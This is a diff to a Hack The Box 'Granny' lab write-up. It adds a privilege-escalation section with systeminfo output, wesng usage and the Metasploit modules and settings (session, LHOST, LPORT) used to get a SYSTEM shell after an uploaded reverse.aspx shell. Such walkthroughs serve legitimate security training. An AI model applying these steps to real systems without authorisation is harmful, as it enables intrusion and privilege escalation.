@@ -179,8 +179,61 @@ Moving `/DavTestDir_kbmSbjBY/reverse.txt' to `/DavTestDir_kbmSbjBY/reverse.aspx'
 - We browse to http://10.10.10.15/DavTestDir_kbmSbjBY/reverse.aspx and get a shell  
 ![shell](../.res/2022-10-10-13-13-53.png)
 - Our user is "network service"
-- Let's check for possible exploi with `systeminfo` we put the result of the command in a file 
 
-[](todo-check-for-exploits-with-win-exp-suggester)
+## Privilege escalation
 
-**Coming soon**
+- Let's check for possible exploit with `systeminfo` we put the result of the command in a file.
+- Systeminfo
+
+```dos
+Host Name:                 GRANNY
+OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
+OS Version:                5.2.3790 Service Pack 2 Build 3790
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Uniprocessor Free
+Registered Owner:          HTB
+Registered Organization:   HTB
+Product ID:                69712-296-0024942-44782
+Original Install Date:     4/12/2017, 5:07:40 PM
+System Up Time:            1 Days, 0 Hours, 47 Minutes, 6 Seconds
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x86 Family 6 Model 85 Stepping 7 GenuineIntel ~2293 Mhz
+BIOS Version:              INTEL  - 6040000
+Windows Directory:         C:\WINDOWS
+System Directory:          C:\WINDOWS\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
+Total Physical Memory:     1,023 MB
+Available Physical Memory: 758 MB
+Page File: Max Size:       2,470 MB
+Page File: Available:      2,306 MB
+Page File: In Use:         164 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 1 Hotfix(s) Installed.
+                           [01]: Q147222
+Network Card(s):           N/A
+```
+
+- We can run windows exploit suggester on it `python3 /opt/wesng/wes.py --color sysinfo.txt | grep -B 3 -A 5 "Privilege"`
+- I want to use metasploit for the privesc so I am going to get a shell using `exploit/windows/iis/iis_webdav_scstoragepathfromurl`
+- This way I will also be able to check local exploit suggester
+- From our session we can run `multi/recon/local_exploit_suggester`
+- I do not get any result this way but from the previous check with wes we can try a few things like CVE-2014-4076.
+- We should also migrate the shell because the getuid gives odd results. we just have to ps while in our sessions and find a pid that runs `NT AUTHORITY\NETWORK SERVICE`
+- With a search on metasploit we find this `exploit/windows/local/ms14_070_tcpip_ioctl`
+- We can use it
+- we set the session with our session id `set session 21` then run and this will elevate our session  
+![authority](../.res/2022-10-14-13-11-24.png)
+- The session dies really quickly so we need to find another exploit. We can try `CVE-2014-4113` (or MS14_058)
+- We can use `exploit/windows/local/ms14_058_track_popup_menu`
+- Now we have to set session, set LHOST and choose a free port for LPORT.
+- Then if we run we get another system shell but this time it does not die on us and we can grab the flags.  
+![system2](../.res/2022-10-14-13-44-37.png)
